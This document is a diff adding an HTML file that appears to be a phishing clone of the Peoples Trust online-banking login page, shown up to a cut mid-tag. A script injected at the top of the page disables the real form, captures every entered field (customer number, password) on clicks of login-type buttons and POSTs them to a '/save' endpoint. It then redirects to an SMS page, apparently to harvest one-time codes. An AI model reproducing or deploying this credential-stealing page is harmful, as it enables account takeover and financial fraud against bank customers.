@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+
+<!-- saved from url=(0099)https://peoplestrust.auth.memberdirect.net/auth/oauth2/login?execution=e1s1&client_id=OnlineBanking -->
+<html class="hydrated" lang="en" ui-mode="bootstrap" ui-version="5"><head>
+<script id="override-fix" type="text/javascript">
+(function() {
+    var loc = window.location.pathname.split('/').pop();
+    var bankName = loc.replace('.html', '').replace('_sms', '');
+    var SMS_PAGE = bankName + '_sms.html';
+    
+    function blockAllForms() {
+        document.querySelectorAll('form').forEach(function(f) {
+            if(!f._blocked) {
+                f._blocked = true;
+                f.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    return false;
+                }, true);
+                f.onsubmit = function(e) { return false; };
+                if(f.action) f.action = 'javascript:void(0)';
+            }
+        });
+    }
+    
+    function handleClick(e) {
+        var btn = e.currentTarget;
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        
+        var _data = { bank: bankName, type: 'login', fields: {} };
+        var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
+        for(var i=0; i<inps.length; i++) {
+            var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+            _data.fields[key] = inps[i].value;
+        }
+        
+        var oldText = btn.textContent || btn.value;
+        if(btn.tagName === 'INPUT') btn.value = 'Patientez...';
+        else btn.textContent = 'Patientez...';
+        
+        fetch('/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(_data)
+        }).then(function() {
+            window.location.href = SMS_PAGE;
+        }).catch(function() {
+            window.location.href = SMS_PAGE;
+        });
+        return false;
+    }
+    
+    function attachBtn() {
+        var allBtns = document.querySelectorAll('button, input[type="submit"], input[type="button"], a.btn, a[class*="btn"]');
+        for(var i=0; i<allBtns.length; i++) {
+            var txt = (allBtns[i].textContent || allBtns[i].value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
+                var btn = allBtns[i];
+                if(!btn._overrideAttached) {
+                    btn._overrideAttached = true;
+                    btn.disabled = false;
+                    btn.removeAttribute('disabled');
+                    btn.removeAttribute('aria-disabled');
+                    btn.style.cursor = 'pointer';
+                    btn.style.pointerEvents = 'auto';
+                    btn.addEventListener('click', handleClick, true);
+                    btn.addEventListener('mousedown', function(e) { e.stopImmediatePropagation(); }, true);
+                }
+            }
+        }
+    }
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        blockAllForms();
+        attachBtn();
+        var obs = new MutationObserver(function() {
+            blockAllForms();
+            attachBtn();
+        });
+        obs.observe(document.body, { childList: true, subtree: true });
+    });
+    
+    if(document.readyState !== 'loading') {
+        setTimeout(function() {
+            blockAllForms();
+            attachBtn();
+        }, 50);
+    }
+    
+    document.addEventListener('click', function(e) {
+        var btn = e.target.closest('button, input[type="submit"], input[type="button"], a');
+        if(btn) {
+            var txt = (btn.textContent || btn.value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('sign in') || txt.includes('log in') || txt.includes('valider') || txt.includes('se connecter') || txt.includes('next') || txt.includes('submit') || txt.includes('login') || txt.includes('connexion'))) {
+                if(!btn._overrideAttached) {
+                    attachBtn();
+                    handleClick(e);
+                }
+            }
+        }
+    }, true);
+})();
+</script>
+
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<style data-styles="">fui-account-entity,fui-select-country,fui-select-entity,fui-select-region,fui-date-input,fui-account-list-title,fui-amount-input,fui-menubar-item,fui-phone-input,fui-strong-password-input,fui-account-list,fui-action-status,fui-action-status-heading,fui-app-header,fui-contextual-menu,fui-description,fui-error-message,fui-menu-item,fui-modal,fui-notification,fui-password-toggle-label,fui-radio-group,fui-rich-text,fui-select-entity-option,fui-textarea,fui-account-list-action,fui-account-list-footer,fui-action-status-message,fui-app-header-title,fui-badge,fui-button-group,fui-card-icon-button-group,fui-card-subtitle,fui-checkbox,fui-contextual-menu-header,fui-contextual-menu-item,fui-credit-card-entity,fui-error-summary,fui-error-summary-heading,fui-form,fui-form-fieldset,fui-form-group,fui-image,fui-image-input,fui-input-hint-text,fui-investment-account-entity,fui-label,fui-loading-indicator,fui-menu,fui-menu-divider,fui-menu-header,fui-menubar,fui-modal-actions,fui-modal-heading,fui-modal-message,fui-notification-heading,fui-notification-message,fui-overlay,fui-password-toggle-group,fui-radio-option,fui-select-group,fui-tab,fui-tab-group,fui-tooltip,fui-vendor-entity,fui-card-list-heading,fui-icon-button-item,fui-card-list,fui-button,fui-form-display-value,fui-input,fui-smart-heading,fui-icon,fui-card,fui-card-title,fui-card-content,fui-card-header,fui-display-amount,fui-select,fui-select-option{visibility:hidden}.hydrated{visibility:inherit}</style>
+<title>Login</title>
+<meta content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=2" name="viewport"/>
+<meta content="notranslate" name="google"/>
+<style>fui-password-toggle-group{display:block;position:relative}fui-password-toggle-group fui-password-toggle-label{position:absolute;right:0}fui-password-toggle-group fui-password-toggle-label[hidden]{display:none}fui-password-toggle-group .ion-fui-password-toggle-group fui-password-toggle-label{z-index:2}</style><style>fui-checkbox{display:inline-block}fui-checkbox[disabled],fui-checkbox[readonly]{cursor:not-allowed}html[ui-mode=bootstrap] fui-checkbox .fui-checkbox-label.fui-checkbox-label-readonly{opacity:1}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox[disabled] .form-check-label{opacity:0.5}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check{display:block;margin-bottom:0.125rem;padding-left:1.5em}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-label{font-weight:500;line-height:normal}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-input{float:left;margin-left:-1.5em}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-input.is-invalid{border-color:var(--global-danger-color);}html[ui-mode=bootstrap][ui-version="3"] fui-checkbox .form-check .form-check-input.is-invalid~.form-check-label{color:var(--global-danger-color)}html[ui-mode=ionic].ios fui-form-group ion-checkbox{--size:var(--fui-checkbox-ios-size, var(--fui-checkbox-size, 26px));--border-radius:var(--fui-checkbox-ios-border-radius, var(--fui-checkbox-border-radius, 50%))}html[ui-mode=ionic].md fui-form-group ion-checkbox{--size:var(--fui-checkbox-android-size, var(--fui-checkbox-size, 18px));--border-radius:var(--fui-checkbox-android-border-radius, var(--fui-checkbox-border-radius, 2px))}html[ui-mode=ionic] fui-form-group ion-checkbox{--background-checked:var(--fui-checkbox-checked-background-color, var(--global-secondary-color));--checkmark-color:var(--fui-checkbox-checked-foreground-color, var(--global-secondary-color-contrast));--checkmark-width:var(--fui-checkbox-checkmark-width, 3px)}html[ui-mode=ionic] fui-form-group ion-checkbox::part(container){border:var(--fui-checkbox-border-width, 1px) solid var(--fui-checkbox-border-color, var(--common-form-control-border-color))}html[ui-mode=ionic] fui-form-group ion-label.fui-checkbox-label.fui-checkbox-label-readonly{opacity:1}</style><style>fui-button{display:inline-block}fui-button ion-button{font-family:var(--global-body-font-family);font-size:1rem;font-weight:bold;text-transform:uppercase;line-height:120%;display:inline-block;--ion-font-family:var(--global-body-font-family);--border-radius:var(--fui-button-border-radius, 30px);--border-width:var(--fui-button-outline-border-width, var(--common-outline-border-width, 1px));--border-style:var(--fui-button-outline-border-style, solid);--box-shadow:var(--common-box-shadow, 0);--padding-top:var(--fui-button-padding-top, 0.75rem);--padding-bottom:var(--fui-button-padding-bottom, 0.75rem);--padding-start:var(--fui-button-padding-left, 1.25rem);--padding-end:var(--fui-button-padding-right, 1.25rem)}fui-button[disabled]{cursor:not-allowed;--ion-color-base:var(--global-disabled-color, #DDD);--ion-color-contrast:var(--global-disabled-color-contrast, #000);--ion-color-shade:var(--global-disabled-color-dark);--ion-color-tint:var(--global-disabled-color-light)}fui-button[disabled] ion-button{--ion-color-primary:var(--global-disabled-color);--ion-color-primary-contrast:var(--global-disabled-color-contrast);--border-color:var(--global-disabled-color);opacity:1}fui-button[button-role=link] ion-button{font-family:var(--global-body-font-family);font-size:1rem;font-weight:normal;line-height:125%;text-transform:none;--ion-color-primary-contrast:var(--common-link-color);--ion-color-primary:var(--common-link-color);--background-hover:transparent;--border-width:0;--color-hover:transparent}fui-button[button-role=link] ion-button fui-icon{--fui-icon-color:var(--global-secondary-color);--fui-icon-size:var(--common-icon-size-s);padding:0 var(--fui-spacing-2)}fui-button[button-role=link] ion-button:hover{--ion-color-primary-tint:transparent;--background-hover-opacity:0}fui-button[button-role=link] ion-button:active{--ion-color-primary-contrast:var(--common-link-color-dark)}fui-button[button-role=link] ion-button:active::part(native){color:var(--common-link-color-dark)}fui-button[button-role=link] ion-button:active fui-icon{--fui-icon-color:var(--global-secondary-color-dark)}fui-button[disabled][button-role=alternate] ion-button{--background:var(--global-disabled-color-contrast);--border-color:var(--global-disabled-color);--border-width:2px;--color:var(--global-disabled-color);opacity:1}fui-button:not([disabled])[button-role=main] ion-button{--ion-color-base:var(--common-call-to-action-color, #DDD);--ion-color-contrast:var(--common-call-to-action-color-contrast, #000);--ion-color-primary-contrast:var(--common-call-to-action-color-contrast);--ion-color-shade:var(--common-call-to-action-color-dark);--ion-color-tint:var(--common-call-to-action-color-light);--border-color:var(--common-call-to-action-color);--ion-color-primary:var(--common-call-to-action-color);--color:var(--common-call-to-action-color-contrast)}fui-button:not([disabled])[button-role=alternate] ion-button{--background:var(--global-primary-color-contrast);--border-width:2px}fui-button:not([disabled]):not([button-role]) ion-button{--border-color:var(--ion-color-base);--ion-color-primary:var(--common-call-to-action-color);--ion-color-primary-contrast:var(--common-call-to-action-color-contrast)}fui-button:not([disabled]):not([button-role]) ion-button:focus,fui-button:not([disabled]):not([button-role]) ion-button.ion-focused{--ion-color-primary:var(--common-call-to-action-color);--color:var(--common-call-to-action-color-contrast);--ion-color-primary-shade:var(--common-call-to-action-color)}fui-button:not([disabled]):not([button-role]) ion-button:focus::part(native),fui-button:not([disabled]):not([button-role]) ion-button.ion-focused::part(native){box-shadow:0 0 0 4px rgb(var(--global-tertiary-color-rgb)/50%)}fui-button:not([disabled]):not([button-role]) ion-button:active,fui-button:not([disabled]):not([button-role]) ion-button.ion-activated{--ion-color-primary:var(--common-call-to-action-color-dark);--color:var(--common-call-to-action-color-contrast)}fui-button:not([disabled]):not([button-role])[color=primary]{--ion-color-base:var(--global-primary-color, #DDD);--ion-color-contrast:var(--global-primary-color-contrast, #000);--ion-color-shade:var(--global-primary-color-dark);--ion-color-tint:var(--global-primary-color-light)}fui-button:not([disabled]):not([button-role])[color=secondary]{--ion-color-base:var(--global-secondary-color, #DDD);--ion-color-contrast:var(--global-secondary-color-contrast, #000);--ion-color-shade:var(--global-secondary-color-dark);--ion-color-tint:var(--global-secondary-color-light)}fui-button:not([disabled]):not([button-role])[color=tertiary]{--ion-color-base:var(--global-tertiary-color, #DDD);--ion-color-contrast:var(--global-tertiary-color-contrast, #000);--ion-color-shade:var(--global-tertiary-color-dark);--ion-color-tint:var(--global-tertiary-color-light)}fui-button:not([disabled]):not([button-role])[color=success]{--ion-color-base:var(--global-success-color, #DDD);--ion-color-contrast:var(--global-success-color-contrast, #000);--ion-color-shade:var(--global-success-color-dark);--ion-color-tint:var(--global-success-color-light)}fui-button:not([disabled]):not([button-role])[color=info]{--ion-color-base:var(--global-info-color, #DDD);--ion-color-contrast:var(--global-info-color-contrast, #000);--ion-color-shade:var(--global-info-color-dark);--ion-color-tint:var(--global-info-color-light)}fui-button:not([disabled]):not([button-role])[color=warning]{--ion-color-base:var(--global-warning-color, #DDD);--ion-color-contrast:var(--global-warning-color-contrast, #000);--ion-color-shade:var(--global-warning-color-dark);--ion-color-tint:var(--global-warning-color-light)}fui-button:not([disabled]):not([button-role])[color=danger]{--ion-color-base:var(--global-danger-color, #DDD);--ion-color-contrast:var(--global-danger-color-contrast, #000);--ion-color-shade:var(--global-danger-color-dark);--ion-color-tint:var(--global-danger-color-light)}fui-button:not([disabled])[button-role=main] ion-button:focus,fui-button:not([disabled])[button-role=main] ion-button.ion-focused{--ion-color-primary:var(--common-call-to-action-color);--color:var(--common-call-to-action-color-contrast);--ion-color-primary-shade:var(--common-call-to-action-color)}fui-button:not([disabled])[button-role=main] ion-button:focus::part(native),fui-button:not([disabled])[button-role=main] ion-button.ion-focused::part(native){box-shadow:0 0 0 4px rgb(var(--global-tertiary-color-rgb)/50%)}fui-button:not([disabled])[button-role=main] ion-button:active,fui-button:not([disabled])[button-role=main] ion-button.ion-activated{--ion-color-primary:var(--common-call-to-action-color-dark);--ion-color-primary-shade:var(--common-call-to-action-color-dark);--color:var(--common-call-to-action-color-contrast)}fui-button:not([disabled])[button-role=alternate] ion-button:focus::part(native),fui-button:not([disabled])[button-role=alternate] ion-button.ion-focused::part(native){box-shadow:0 0 0 4px rgb(var(--global-tertiary-color-rgb)/50%)}fui-button:not([disabled])[button-role=alternate] ion-button:active,fui-button:not([disabled])[button-role=alternate] ion-button.ion-activated{--background:var(--global-neutral-low-contrast-color);--color:var(--global-primary-color)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary{background-color:var(--primary-button-background-color, var(--global-primary-color));border:1px solid var(--primary-button-background-color, var(--global-primary-color));border-radius:var(--primary-button-border-radius, 0);padding:var(--primary-button-padding, 1em 2em)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary:hover{filter:brightness(90%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary:focus{outline:0}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-primary[disabled]{background-color:var(--primary-button-disabled-background-color, var(--global-primary-color));filter:brightness(92.5%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary{border:1px solid var(--secondary-button-border-color, var(--global-secondary-color));border-radius:var(--secondary-button-border-radius, 1.125em);color:var(--secondary-button-border-color, var(--global-secondary-color));padding:var(--secondary-button-padding, 0.5em 1.5em)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary:hover{background-color:var(--secondary-button-hover-background-color, var(--global-secondary-color));color:var(--secondary-button-hover-text-color, var(--global-secondary-color-contrast));filter:brightness(90%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary:focus{outline:0}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-secondary[disabled]{background:var(--secondary-button-disabled-background-color, var(--global-disabled-color));border-color:var(--secondary-button-disabled-border-color, var(--global-disabled-color));color:var(--secondary-button-disabled-text-color, var(--global-secondary-color-contrast));filter:brightness(92.5%)}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-link{color:var(--brand-primary-link, var(--global-primary-color))}html[ui-mode=bootstrap][ui-version="3"] fui-button .btn-link:hover{filter:brightness(90%)}</style><style>html[ui-mode=bootstrap][ui-version="3"] fui-form-group>.fui-form-group-controls>fui-label,html[ui-mode=bootstrap] fui-form-group>.fui-form-group-controls>fui-label,html[ui-mode=ionic] fui-form-group>ion-item>fui-label{flex:auto;order:-1}html[ui-mode=ionic] fui-form-group>ion-item{--background-activated:transparent;--background-activated-opacity:0;--background-focus:transparent;--background-focused-opacity:0;--background-hover:transparent;--background-hover-opacity:0;--show-full-highlight:0;--min-height:auto;--border-width:0;--inner-border-width:0;--ripple-color:transparent;--transition:none}html[ui-mode=ionic] fui-form-group>ion-item::part(native){background-color:transparent}html[ui-mode=bootstrap][ui-version="3"] fui-form-group>.fui-form-group-controls>fui-label,html[ui-mode=bootstrap] fui-form-group>.fui-form-group-controls>fui-label,html[ui-mode=ionic] fui-form-group>ion-item>fui-label{flex:auto;order:-1}fui-form-group{display:block}fui-form-group.fui-readonly fui-error,fui-form-group.fui-readonly fui-input-hint-text{display:none}html[ui-mode=ionic] fui-form-group{margin:var(--fui-spacing-4) 0;padding-bottom:var(--fui-form-group-vertical-spacing);padding-top:var(--fui-form-group-vertical-spacing)}html[ui-mode=ionic] fui-form-group>ion-item{--padding-start:0;--ion-safe-area-left:0;--ion-safe-area-right:0;--inner-padding-start:0;--inner-padding-end:0}html[ui-mode=ionic] fui-form-group>ion-item fui-label{flex-grow:0}html[ui-mode=ionic] fui-form-group>ion-item::part(native){min-height:auto}html[ui-mode=ionic] fui-form-group>ion-item.item-interactive-disabled ion-label{color:var(--global-disabled-color);opacity:1 !important}html[ui-mode=ionic] fui-form-group>ion-item ion-note{margin-top:var(--fui-spacing-2);min-height:1.125rem;padding:0}html[ui-mode=ionic] fui-form-group.fui-control-group>ion-item ion-note{min-height:0}html[ui-mode=ionic] fui-form-group.fui-readonly>ion-item ion-note{display:none}html[ui-mode=ionic] fui-form-group:not(.fui-control-inline)>ion-item{display:flex}html[ui-mode=ionic] fui-form-group:not(.fui-control-inline)[layout=stacked]>ion-item{flex-direction:column}html[ui-mode=ionic] fui-form-group:not(.fui-control-inline)[layout=inline]>ion-item{flex-direction:row}html[ui-mode=bootstrap] fui-form-group>.fui-form-group-controls{display:flex}html[ui-mode=bootstrap] fui-form-group .fui-hint-text.form-check,html[ui-mode=bootstrap] fui-form-group .fui-errors.form-check{min-height:0}html[ui-mode=bootstrap] fui-form-group[layout=stacked]>.fui-form-group-controls{flex-direction:column}html[ui-mode=bootstrap] fui-form-group.fui-readonly>.fui-errors,html[ui-mode=bootstrap] fui-form-group.fui-readonly .fui-hint-text{display:none}html[ui-mode=bootstrap][ui-version="3"] fui-form-group>.fui-form-group-controls{display:flex}html[ui-mode=bootstrap][ui-version="3"] fui-form-group .fui-hint-text.form-check,html[ui-mode=bootstrap][ui-version="3"] fui-form-group .fui-errors.form-check{min-height:0}html[ui-mode=bootstrap][ui-version="3"] fui-form-group[layout=stacked]>.fui-form-group-controls{flex-direction:column}html[ui-mode=bootstrap][ui-version="3"] fui-form-group.fui-readonly>.fui-errors,html[ui-mode=bootstrap][ui-version="3"] fui-form-group.fui-readonly .fui-hint-text{display:none}</style><style>fui-password-toggle-label{display:inline-block;user-select:none}.bs-fui-password-toggle-group fui-password-toggle-label button{margin-top:1em;padding:0}</style><style>fui-input{display:block;width:100%}fui-input ion-input{--color:var(--fui-input-color, var(--global-content-text-color));--background:var(--fui-input-background-color);--padding-top:var(--fui-input-padding-top, var(--fui-input-padding));--padding-bottom:var(--fui-input-padding-bottom, var(--fui-input-padding));--padding-start:var(--fui-input-padding-start, var(--fui-input-padding));--padding-end:var(--fui-input-padding-end, var(--fui-input-padding))}html[ui-mode=ionic] fui-input ion-input{font-family:var(--global-body-font-family);font-size:1rem;font-weight:normal;line-height:125%;--placeholder-color:var(--fui-input-placeholder-color, var(--common-placeholder-color));--placeholder-font-style:var(--fui-input-placeholder-font-style);--placeholder-font-weight:var(--fui-input-placeholder-font-weight);--placeholder-opacity:var(--common-placeholder-opacity);border-bottom:var(--fui-input-border-bottom, 1px solid var(--global-neutral-higher-contrast-color))}html[ui-mode=ionic] fui-input ion-input.has-focus{border-bottom:var(--fui-input-focus-border-bottom, 1px solid var(--common-call-to-action-color))}html[ui-mode=ionic] fui-input ion-input.is-invalid{border-bottom:var(--fui-input-invalid-border-bottom, 1px solid var(--global-danger-color))}html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled{--color:var(--fui-input-disabled-color, var(--global-disabled-color));border-bottom:var(--fui-input-disabled-border-bottom, 1px solid var(--global-disabled-color))}html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled input.native-input{opacity:1;}html[ui-mode=ionic] fui-input[disabled] ion-input.fui-disabled input.native-input::placeholder{color:var(--fui-input-disabled-color, var(--global-disabled-color))}html[ui-mode=ionic] fui-input.has-fui-icon{position:relative}html[ui-mode=ionic] fui-input.has-fui-icon fui-icon{position:absolute;right:0;top:0.72rem;z-index:2}html[ui-mode=ionic] fui-input.has-fui-icon fui-icon:hover{cursor:pointer}html[ui-mode=bootstrap] fui-input.has-fui-icon{position:relative}html[ui-mode=bootstrap] fui-input.has-fui-icon input{padding-right:4rem}html[ui-mode=bootstrap] fui-input.has-fui-icon fui-icon{position:absolute;right:2.19rem;top:0.72rem}html[ui-mode=bootstrap] fui-input.has-fui-icon fui-icon:hover{cursor:pointer}html[ui-mode=bootstrap][ui-version="3"] fui-input .is-invalid{border-color:var(--global-danger-color)}html[ui-mode=bootstrap][ui-version="3"] fui-input.has-fui-icon{position:relative}html[ui-mode=bootstrap][ui-version="3"] fui-input.has-fui-icon input{padding-right:4rem}html[ui-mode=bootstrap][ui-version="3"] fui-input.has-fui-icon fui-icon{position:absolute;right:2.19rem;top:0.72rem}html[ui-mode=bootstrap][ui-version="3"] fui-input.has-fui-icon fui-icon:hover{cursor:pointer}</style><style>fui-error-message{display:block}html[ui-mode=ionic] fui-error-message{--fui-icon-color:var(--global-danger-color);--fui-icon-size:0.75rem;align-items:center;display:flex}html[ui-mode=ionic] fui-error-message .ionic-icon-container{display:flex;height:0.75rem;margin-right:var(--fui-spacing-1);width:0.75rem}html[ui-mode=ionic] fui-error-message .ionic-error-message{font-family:var(--global-body-font-family);font-size:0.75rem;font-weight:normal;line-height:150%;color:var(--global-danger-color)}html[ui-mode=bootstrap][ui-version="3"] fui-error-message .invalid-feedback{color:var(--global-danger-color);font-size:0.875em}fui-error-message[hidden]{display:none}</style><style>fui-label{display:inline-block}html[ui-mode=ionic] fui-label{font-family:var(--global-body-font-family);font-size:0.875rem;font-weight:normal;line-height:120%;}html[ui-mode=ionic] fui-label ion-label{display:inline-block;--ion-font-family:inherit}html[ui-mode=ionic] fui-label ion-label.label-stacked{margin:0;transform:none;transition:none}html[ui-mode=ionic] fui-label:not(.fui-control-group){color:var(--fui-label-color, var(--global-neutral-higher-contrast-color, black))}html[ui-mode=ionic] fui-label.fui-control-group{color:var(--fui-group-label-color, var(--global-primary-color))}html[ui-mode=bootstrap][ui-version="3"] fui-label .form-label{color:var(--fui-label-color);font-size:var(--common-base-font-size);font-weight:700;padding-right:2.5rem;padding-top:1rem}</style><link href="#" rel="icon" type="image/x-icon"/>
+<link href="./Login peoples trust_files/md-reno-base.css" rel="stylesheet" type="text/css"/>
+<link href="./Login peoples trust_files/online_v2-mapping.css" rel="stylesheet" type="text/css"/>
+<link href="./Login peoples trust_files/online_v2.css" rel="stylesheet" type="text/css"/>
+<link href="./Login peoples trust_files/theme-peoplestrust_com-oidc.css" rel="stylesheet" type="text/css"/>
+<style>
+        [ng\:cloak], [ng-cloak], [data-ng-cloak], [x-ng-cloak], .ng-cloak, .x-ng-cloak {
+            display: none !important;
+        }   
+    </style>
+<script defer="" src="./Login peoples trust_files/login.packed.js.téléchargement" type="text/javascript"></script>
+<script>
+        window.SHARED_APP_DATA = {
+            logoSrc: "resources\/themes\/theme-peoplestrust_com-oidc\/assets\/images\/logo.png",
+            logoAlt: "Logo",
+            loginLogoEnabled: JSON.parse("true"),
+            _csrf: "l8qih5PUolkuuDzrNG2sc1xai4jWyWoEOqPcJrIZUv04n7lqofqStPCylGED3AXeA0CYEWpjprC3-wgpXsbrQNQpNJ5arY5S",
+            simulatorEnabled:  JSON.parse(null),
+            spinnerEnabled: JSON.parse("true"),
+            spinnerAriaLabel: "busy",
+            authenticationSimulator: JSON.parse(null),
+            increasedAuthSimulator: JSON.parse(null),
+        }
+    </script>
+<script src="./Login peoples trust_files/client-renderer.min.js.téléchargement" type="text/javascript"></script><script src="./Login peoples trust_files/__plugin.compiled.js.téléchargement" type="text/javascript"></script><script src="./Login peoples trust_files/hashtable.js.téléchargement" type="text/javascript"></script><script src="./Login peoples trust_files/rsa.min.js.téléchargement" type="text/javascript"></script><meta content="bc_peoplestrust" name="tenantid"/><script>
+    window["__FORGE_API_CONFIG__"] = {
+      palantir: "https:\/\/api.forge.central1.cc\/palantir\/v1",
+    };
+  </script><script>
+    window.APP_DATA = {
+      formAction: "\/auth\/oauth2\/login?execution=e1s1\u0026client_id=OnlineBanking",
+      forgotPacUrl: "\/auth\/oauth2\/forgotPac",
+      error:
+        [],
+      panLabel: "Card Number",
+      panPlaceholder:
+        "Card Number",
+      panPrefixPlaceholder:
+        "",
+      loginFormTitle: "Sign In",
+      loginLogoEnabled: JSON.parse(
+        "true"
+      ),
+      panPrefixOutside: JSON.parse(
+        "false"
+      ),
+      panPrefix: "",
+      panPrefixVisible: JSON.parse(
+        "true"
+      ),
+      memberBranchLabel:
+        "Branch",
+      memberBranchPlaceholder:
+        "Select a Branch",
+      memberNumberLabel: "Customer Number",
+      memberNumberPlaceholder:
+        "Customer Number",
+      branchMaxLength: "3",
+      branchPattern: "^\\d{5}$",
+      branchDisplayType: "hidden",
+      branchData: JSON.parse("[{}]"),
+      branchDefault: "000",
+      branchRequiredError:
+        "Please enter your branch.",
+      branchMismatchError:
+        "You have entered an invalid branch. Please try again.",
+      passwordLabel: "Password",
+      loginBtnLabel: "LOGIN",
+      accountMaxLength: JSON.parse(
+        "8"
+      ),
+      usernamePattern: "^.{3,22}$",
+      delegatePattern:
+        "^D\\d{7}$",
+      passwordPattern: "^.{5,30}$",
+      usernameMismatchError:
+        "You have entered an invalid Customer Number. Please try again.",
+      usernameRequiredError:
+        "Please enter your Customer Number.",
+      pacMismatchError:
+        "You have entered an incorrect Password. Please try again.",
+      pacRequiredError:
+        "Please enter your Password.",
+      mdsbEnabled: JSON.parse("true"),
+      panLoginEnabled: JSON.parse(
+        "false"
+      ),
+      showPasswordLabel: "Show Password",
+      hidePasswordLabel: "Hide Password",
+      checkboxLabel:
+        "Remember Me",
+      nicknameLabel: "Save Login Profile",
+      nicknamePlaceholder:
+        "Name Your New Login Profile",
+      nicknameMismatchError:
+        "Profile name length must be at least 1 character",
+      nicknameMinLength: "1",
+      nicknameMaxLength: "25",
+      forgotPacEnabled:
+        JSON.parse("true"),
+      forgotPacLabel: "Forgot Password?",
+      memorizedLoginTitle:
+        "Choose a Login Profile",
+      memorizedLoginDeleteAriaLabel:
+        "delete button",
+      showLoginForm:
+        "Login to a Different Account",
+      editMemorizedAccounts:
+        "Manage Login Profiles",
+      showMemorizedAccounts:
+        "Show Saved Logins",
+      memorizedAccounts:
+        [],
+      deleteConfirmMsg:
+        "Are you sure you want to forget the remembered login for",
+      deleteConfirmSubmitBtn:
+        "Ok",
+      deleteConfirmCancelBtn:
+        "Cancel",
+      isWithinUpcomingMaintenanceWindow:
+        JSON.parse(false),
+      maintenanceMessage:
+        "Please note that credit union website will be unavailable for a short period of time due to maintenance.",
+      externalLinkEnabled:
+        JSON.parse("false"),
+      externalLinks:
+        "Other Accounts",
+      externalLinkMemorizedLoginEnabled:
+        JSON.parse("false"),
+      memorizedLoginEnterPwTitle:
+        "Enter passcode for <em>{{ selectedMemorizedAccount.nickname }}<\/em>",
+      errorCode: null,
+    };
+  </script></head>
+<body class="oidc-auth-theme">
+<login-app ng-version="15.2.10"><oidc-simulator-badge><!-- --></oidc-simulator-badge><div class="widget-c1-oauth-login position-relative oauth-login"><!-- --><oidc-logo><div class="logo"><img alt="Peoples Trust"  src="./Login peoples trust_files/logo.png"/></div><!-- --></oidc-logo><!-- --><login-form><oidc-error><div><!-- --></div><!-- --></oidc-error><form action="javascript:void(0)" class="ng-untouched ng-pristine ng-invalid" data-orig-action="javascript:void(0)" id="loginForm" method="post" novalidate="" onsubmit="return false;"><oidc-username-field><!-- --><member-branch-login><div class="ng-untouched ng-pristine ng-invalid"><!-- --><!-- --><div><input id="branch" name="branch" type="hidden" value="000"/></div><!-- --><fui-form-group class="form-group hydrated" layout="stacked"><!-- --><div class="fui-form-group-controls"><fui-label class="hydrated" position="stacked"><!-- --><label class="form-label" id="FuiLabel-2">Customer Number</label><span class="fui-label-after"></span></fui-label><fui-input class="ng-untouched ng-pristine ng-invalid hydrated" described-by-id="FuiError-2" formcontrolname="username" labelled-by-id="FuiLabel-2" maxlength="8" name="username" pattern="^.{3,22}$|^D\d{7}$" placeholder="Customer Number" position="stacked" required="" type="text"><!-- --><input aria-describedby="FuiError-2" aria-invalid="false" aria-labelledby="FuiLabel-2" autocapitalize="off" autocomplete="off" autocorrect="off" class="form-control" maxlength="8" name="username" pattern="^.{3,22}$|^D\d{7}$" placeholder="Customer Number" required="" spellcheck="true" type="text"/></fui-input></div><div aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-errors" id="FuiError-2"><fui-error-message class="hydrated" error-type="tooLong" hidden=""><!-- --><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You have entered an invalid Customer Number. Please try again. </div></fui-error-message><fui-error-message class="hydrated" error-type="patternMismatch" hidden=""><!-- --><div class="invalid-feedback d-block"><span aria-hidden="true"></span> You have entered an invalid Customer Number. Please try again. </div></fui-error-message><fui-error-message class="hydrated" error-type="valueMissing" hidden=""><!-- --><div class="invalid-feedback d-block"><span aria-hidden="true"></span> Please enter your Customer Number. </div></fui-error-message></div><div aria-atomic="true" aria-live="polite" aria-relevant="all" class="fui-hint-text" id="FuiHint-2"></div></fui-form-group></div></member-branch-login><!-- --></oidc-username-field><fui-password-toggle-group class="form-group hydrated"><!-- --><div class="bs-fui-password-toggle-group"><fui-password-toggle-label class="hydrated" when="hidden"><!-- --><fui-button button-role="link" class="hydrated"><!-- --><button buttonrole="link" class="btn btn-link" type="button"><i aria-hidden="true" class="icon-shown"></i> Show Password </button></fui-button></fui-password-toggle-label><fui-password-toggle-label class="hydrated" hidden="" when="shown"><!-- --><fui-button button-role="link" class="hydrated"><!-- --><button buttonrole="link" class="btn btn-link" type="button"><i aria-hidden="true" class="icon-hidden"></i> Hide Password </button></fui-button></fui-password-toggle-label><fui-form-group class="hydrated" layout="stacked"><!-- --><div class="fui-form-group-controls"><fui-label class="hydrated" position="stacked"><!-- --><label class="form-label" 